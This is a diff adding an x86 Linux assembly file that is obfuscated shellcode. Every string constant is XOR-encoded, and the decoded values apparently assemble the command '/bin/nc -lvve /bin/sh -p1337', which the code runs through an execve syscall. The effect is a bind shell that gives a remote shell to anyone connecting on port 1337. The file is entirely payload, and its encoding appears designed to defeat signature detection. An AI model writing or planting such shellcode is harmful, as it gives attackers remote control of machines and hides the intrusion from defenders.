@@ -1,0 +1,41 @@
+section .text
+    global _start
+_start:
+	xor ebx,ebx
+	imul ebx
+	mov ebp, esp	
+	mov edx, 0x556262CC
+	mov ebx, 0x555555FF
+	xor edx, ebx
+	push edx	
+	xor ebx, 0x666425d2
+	push ebx
+	mov edx, esp
+	push eax
+	
+	mov ecx, 0x89765432
+	mov ebx, 0x891e271d
+	xor ebx, ecx
+	push ebx
+	xor ecx, 0xE71F361D		;push 0x6e69622f
+	push ecx	
+	mov ebx, 0xb7fc2ff4		;push 0x65766c2d
+	xor ebx, 0xd28a43d9	
+	mov ecx,esp
+	push eax
+	
+	push 0xff636e2f
+	mov [ebp-29], al	
+	mov ebx, 0xb7fc2ff4	
+	xor ebx, 0xD9954DDB		;push 0x6e69622f
+	push ebx	
+	mov ebx, esp
+	push eax
+	push edx
+	push ecx
+	push ebx
+	cdq
+	add edx, 0xb	
+	mov  ecx,esp
+	xchg edx, eax
+	int 0x80
